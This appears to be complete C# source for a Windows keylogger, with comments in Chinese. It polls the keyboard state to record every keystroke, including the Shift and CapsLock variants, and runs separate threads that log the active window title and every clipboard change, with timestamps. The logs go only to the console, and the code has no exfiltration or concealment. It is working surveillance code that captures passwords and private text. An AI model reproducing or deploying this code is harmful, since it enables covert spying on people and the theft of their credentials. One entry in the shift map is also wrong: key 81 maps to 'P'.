using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLoggerByState
{
    class Program
    {
        static void Main(string[] args)
        {
            new Thread(WindowLogger.windowLogger).Start();
            new Thread(ClipboardLogger.clipboardLogger).Start();

            new KeyLoggerByState();
        }
    }

    class KeyLoggerByState
    {
        [DllImport("User32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int nVirtKey);

        [DllImport("User32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetAsyncKeyState(int nVirtKey);


        static short key_state;
        static short capitalize_state;

        static int VK_CAPITAL = 0x14;
        static int VK_SHIFT = 0x10;

        static short Pressed = 1; // 键被按下过
        static short Pressing = -32767; // 键正在按下中（长按）
        static short Pressing2 = -32768; // 按下过后按过其他的（长按）

        static KeyLoggerByState()
        {
            // 获取大小写状态
            capitalize_state = GetKeyState(VK_CAPITAL);
            Console.WriteLine("capitalize_status -> " + capitalize_state); // 1开启，0关闭

            while (true)
            {
                bool SHIFT = false;
                int shift_key_state = 0;
                string key_log_text = "";

                foreach (int vk in KEYS.keys_enum.Keys)
                {
                    key_state = GetAsyncKeyState(vk); // 获取按键状态

                    if (key_state == Pressed || key_state == Pressing) // 键被按过或正在按下
                    {
                        // 每次有键按下检查Shift当前状态
                        shift_key_state = GetAsyncKeyState(VK_SHIFT);
                        if (shift_key_state == Pressing || shift_key_state == Pressing2)
                        {
                            SHIFT = true;
                        }

                        // CapsLock被按下过，切换大小写状态
                        if (vk == VK_CAPITAL)
                        {
                            capitalize_state ^= 1;
                        }

                        // 获取键盘内容
                        if (SHIFT) // SHIFT长按状态
                        {
                            key_log_text = KEYS.keys_shift_enum[vk];
                        }
                        else if (capitalize_state == 1)  // 大写状态
                        {
                            key_log_text = KEYS.keys_capitalize_enum[vk];
                        }
                        else // 大写关闭且SHIFT为没按的状态
                        {
                            key_log_text = KEYS.keys_enum[vk];
                        }

                        Console.WriteLine($"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\tKeyLogger： {key_log_text}");
                    }
                }
                Thread.Sleep(10);
            }
        }

        class KEYS
        {
            public static Dictionary<int, string> keys_enum = new Dictionary<int, string>()
            {
                { 8, "[Back]" },
                { 9, "[Tab]" },
                //{ 10, "[Shift]" },
                { 13, "[Enter]\r\n" },
                //{ 16, "[SHIFT]" },
                //{ 17, "[Ctrl]" },
                //{ 18, "[Alt]" },
                { 19, "[PauseBreak]" },
                { 20, "[CapsLock]" }, //CAPS LOCK
                { 27, "[Esc]" },
                { 32, " " }, //SPACE
                { 33, "[PageUp]" },
                { 34, "[PageDown]" },
                { 35, "[End]" },
                { 36, "[Home]" },
                { 37, "[Left]" },
                { 38, "[Up]" },
                { 39, "[Right]" },
                { 40, "[Down]" },
                { 41, "[Select]" },
                { 42, "[Print]" },
                { 43, "[Execute]" },
                { 44, "[PrintScreen]" },
                { 45, "[Insert]" },
                { 46, "[Delete]" },
                { 47, "[Help]" },
                { 48, "0" },
                { 49, "1" },
                { 50, "2" },
                { 51, "3" },
                { 52, "4" },
                { 53, "5" },
                { 54, "6" },
                { 55, "7" },
                { 56, "8" },
                { 57, "9" },
                { 65, "a" },
                { 66, "b" },
                { 67, "c" },
                { 68, "d" },
                { 69, "e" },
                { 70, "f" },
                { 71, "g" },
                { 72, "h" },
                { 73, "i" },
                { 74, "j" },
                { 75, "k" },
                { 76, "l" },
                { 77, "m" },
                { 78, "n" },
                { 79, "o" },
                { 80, "p" },
                { 81, "q" },
                { 82, "r" },
                { 83, "s" },
                { 84, "t" },
                { 85, "u" },
                { 86, "v" },
                { 87, "w" },
                { 88, "x" },
                { 89, "y" },
                { 90, "z" },
                { 91, "[Windows]" },
                { 92, "[Windows]" },
                { 93, "[Applications]" },
                { 94, "" },
                { 95, "[Sleep]" },
                { 96, "0" },
                { 97, "1" },
                { 98, "2" },
                { 99, "3" },
                { 100, "4" },
                { 101, "5" },
                { 102, "6" },
                { 103, "7" },
                { 104, "8" },
                { 105, "9" },
                { 106, "*" },
                { 107, "+" },
                { 108, "[Separator]" },
                { 109, "-" },
                { 110, "." },
                { 111, "[Divide]" }, // 小键盘的 /
                { 112, "[F1]" },
                { 113, "[F2]" },
                { 114, "[F3]" },
                { 115, "[F4]" },
                { 116, "[F5]" },
                { 117, "[F6]" },
                { 118, "[F7]" },
                { 119, "[F8]" },
                { 120, "[F9]" },
                { 121, "[F10]" },
                { 122, "[F11]" },
                { 123, "[F12]" },
                { 144, "[NumLock]" },
                { 145, "[ScrollLock]" },
                { 160, "[L-Shift]" }, //LShift
                { 161, "[R-Shift]" }, //RShift
                { 162, "[L-Ctrl]" }, //Left Ctrl
                { 163, "[R-Ctrl]" }, //Right Ctrl
                { 164, "[L-Alt]" }, //Left Menu
                { 165, "[R-Alt]" }, //Right Menu
                { 186, ";" },
                { 187, "=" },
                { 188, "," },
                { 189, "-" },
                { 190, "." },
                { 191, "/" },
                { 192, "`" },
                { 219, "[" },
                { 220, "\\" },
                { 221, "]" },
                { 222, "'" },
                { 223, "!" }
            };

            public static Dictionary<int, string> keys_capitalize_enum = new Dictionary<int, string>()
            {
                { 8, "[Back]" },
                { 9, "[Tab]" },
                //{ 10, "[Shift]" },
                { 13, "[Enter]\r\n" },
                //{ 16, "[SHIFT]" },
                //{ 17, "[Ctrl]" },
                //{ 18, "[Alt]" },
                { 19, "[PauseBreak]" },
                { 20, "[CapsLock]" }, //CAPS LOCK
                { 27, "[Esc]" },
                { 32, " " }, //SPACE
                { 33, "[PageUp]" },
                { 34, "[PageDown]" },
                { 35, "[End]" },
                { 36, "[Home]" },
                { 37, "[Left]" },
                { 38, "[Up]" },
                { 39, "[Right]" },
                { 40, "[Down]" },
                { 41, "[Select]" },
                { 42, "[Print]" },
                { 43, "[Execute]" },
                { 44, "[PrintScreen]" },
                { 45, "[Insert]" },
                { 46, "[Delete]" },
                { 47, "[Help]" },
                { 48, ")" },
                { 49, "!" },
                { 50, "@" },
                { 51, "#" },
                { 52, "$" },
                { 53, "%" },
                { 54, "^" },
                { 55, "&" },
                { 56, "*" },
                { 57, "(" },
                { 65, "A" },
                { 66, "B" },
                { 67, "C" },
                { 68, "D" },
                { 69, "E" },
                { 70, "F" },
                { 71, "G" },
                { 72, "H" },
                { 73, "I" },
                { 74, "J" },
                { 75, "K" },
                { 76, "L" },
                { 77, "M" },
                { 78, "N" },
                { 79, "O" },
                { 80, "P" },
                { 81, "Q" },
                { 82, "R" },
                { 83, "S" },
                { 84, "T" },
                { 85, "U" },
                { 86, "V" },
                { 87, "W" },
                { 88, "X" },
                { 89, "Y" },
                { 90, "Z" },
                { 91, "[Windows]" },
                { 92, "[Windows]" },
                { 93, "[Applications]" },
                { 94, "" },
                { 95, "[Sleep]" },
                { 96, "0" },
                { 97, "1" },
                { 98, "2" },
                { 99, "3" },
                { 100, "4" },
                { 101, "5" },
                { 102, "6" },
                { 103, "7" },
                { 104, "8" },
                { 105, "9" },
                { 106, "*" },
                { 107, "+" },
                { 108, "[Separator]" },
                { 109, "-" },
                { 110, "." },
                { 111, "[Divide]" }, // 小键盘的 /
                { 112, "[F1]" },
                { 113, "[F2]" },
                { 114, "[F3]" },
                { 115, "[F4]" },
                { 116, "[F5]" },
                { 117, "[F6]" },
                { 118, "[F7]" },
                { 119, "[F8]" },
                { 120, "[F9]" },
                { 121, "[F10]" },
                { 122, "[F11]" },
                { 123, "[F12]" },
                { 144, "[NumLock]" },
                { 145, "[ScrollLock]" },
                { 160, "[L-Shift]" }, //LShift
                { 161, "[R-Shift]" }, //RShift
                { 162, "[L-Ctrl]" }, //Left Ctrl
                { 163, "[R-Ctrl]" }, //Right Ctrl
                { 164, "[L-Alt]" }, //Left Menu
                { 165, "[R-Alt]" }, //Right Menu
                { 186, ":" },
                { 187, "+" },
                { 188, "<" },
                { 189, "_" },
                { 190, ">" },
                { 191, "?" },
                { 192, "~" },
                { 219, "°" },
                { 220, "|" },
                { 221, "}" },
                { 222, "\"" },
                { 223, "!" }
            };

            public static Dictionary<int, string> keys_shift_enum = new Dictionary<int, string>()
            {
                { 8, "[Back]" },
                { 9, "[Tab]" },
                //{ 10, "[Shift]" },
                { 13, "[Enter]\r\n" },
                //{ 16, "[SHIFT]" },
                //{ 17, "[Ctrl]" },
                //{ 18, "[Alt]" },
                { 19, "[PauseBreak]" },
                { 20, "[CapsLock]" }, //CAPS LOCK
                { 27, "[Esc]" },
                { 32, " " }, //SPACE
                { 33, "[PageUp]" },
                { 34, "[PageDown]" },
                { 35, "[End]" },
                { 36, "[Home]" },
                { 37, "[Left]" },
                { 38, "[Up]" },
                { 39, "[Right]" },
                { 40, "[Down]" },
                { 41, "[Select]" },
                { 42, "[Print]" },
                { 43, "[Execute]" },
                { 44, "[PrintScreen]" },
                { 45, "[Insert]" },
                { 46, "[Delete]" },
                { 47, "[Help]" },
                { 48, ")" },
                { 49, "!" },
                { 50, "@" },
                { 51, "#" },
                { 52, "$" },
                { 53, "%" },
                { 54, "^" },
                { 55, "&" },
                { 56, "*" },
                { 57, "(" },
                { 65, "A" },
                { 66, "B" },
                { 67, "C" },
                { 68, "D" },
                { 69, "E" },
                { 70, "F" },
                { 71, "G" },
                { 72, "H" },
                { 73, "I" },
                { 74, "J" },
                { 75, "K" },
                { 76, "L" },
                { 77, "M" },
                { 78, "N" },
                { 79, "O" },
                { 80, "P" },
                { 81, "P" },
                { 82, "R" },
                { 83, "S" },
                { 84, "T" },
                { 85, "U" },
                { 86, "V" },
                { 87, "W" },
                { 88, "X" },
                { 89, "Y" },
                { 90, "Z" },
                { 91, "[Windows]" },
                { 92, "[Windows]" },
                { 93, "[Applications]" },
                { 94, "" },
                { 95, "[Sleep]" },
                { 96, "0" },
                { 97, "1" },
                { 98, "2" },
                { 99, "3" },
                { 100, "4" },
                { 101, "5" },
                { 102, "6" },
                { 103, "7" },
                { 104, "8" },
                { 105, "9" },
                { 106, "*" },
                { 107, "+" },
                { 108, "[Separator]" },
                { 109, "-" },
                { 110, "" },
                { 111, "[Divide]" }, // 小键盘的 /
                { 112, "[F1]" },
                { 113, "[F2]" },
                { 114, "[F3]" },
                { 115, "[F4]" },
                { 116, "[F5]" },
                { 117, "[F6]" },
                { 118, "[F7]" },
                { 119, "[F8]" },
                { 120, "[F9]" },
                { 121, "[F10]" },
                { 122, "[F11]" },
                { 123, "[F12]" },
                { 144, "[NumLock]" },
                { 145, "[ScrollLock]" },
                { 160, "[L-Shift]" }, //LShift
                { 161, "[R-Shift]" }, //RShift
                { 162, "[L-Ctrl]" }, //Left Ctrl
                { 163, "[R-Ctrl]" }, //Right Ctrl
                { 164, "[L-Alt]" }, //Left Menu
                { 165, "[R-Alt]" }, //Right Menu
                { 186, ":" },
                { 187, "+" },
                { 188, "<" },
                { 189, "_" },
                { 190, ">" },
                { 191, "?" },
                { 192, "~" },
                { 219, "{" },
                { 220, "|" },
                { 221, "}" },
                { 222, "\"" },
                { 223, "!" }
            };
        }
    }

    class ClipboardLogger
    {
        public static void clipboardLogger()
        {
            string old_text = "";
            string text;

            while (true)
            {
                text = ClipboardAsync.GetText();

                if (text != "" && text != old_text)
                {
                    Console.WriteLine($"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\tClipboardLogger： {text} \n\n");

                    old_text = text;
                }

                Thread.Sleep(200);
            }
        }
    }

    class WindowLogger
    {
        [DllImport("User32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("User32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);


        public static void windowLogger()
        {
            string old_window_title_text = "";

            while (true)
            {
                string window_title_text = getWindowTitleText();

                if (window_title_text != "" && window_title_text != old_window_title_text)
                {
                    Console.WriteLine($"[ {window_title_text} ]");

                    old_window_title_text = window_title_text;
                }

                Thread.Sleep(200);
            }
        }

        static string getWindowTitleText()
        {
            // 获取当前前景窗口句柄
            IntPtr current_window_handle = GetForegroundWindow();

            // 通过句柄获取指定窗口标题栏
            StringBuilder window_title_text = new StringBuilder(4096); // 定义接收文本的缓冲区
            int window_title_text_length = GetWindowText(current_window_handle, window_title_text, window_title_text.Capacity);

            return window_title_text.ToString();
        }
    }


    // 解决剪切板只允许 [STAThread] 单线程程序使用剪切板的限制
    class ClipboardAsync
    {
        private string _getText;
        private void ThGetText(object format)
        {
            try
            {
                _getText = format == null ? Clipboard.GetText() : Clipboard.GetText((TextDataFormat)format);
            }
            catch
            {
                _getText = null;
            }
        }

        public static string GetText()
        {
            var instance = new ClipboardAsync();
            var staThread = new Thread(instance.ThGetText);
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
            return instance._getText;
        }

        public static string GetText(TextDataFormat format)
        {
            var instance = new ClipboardAsync();
            var staThread = new Thread(instance.ThGetText);
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start(format);
            staThread.Join();
            return instance._getText;
        }
    }
}
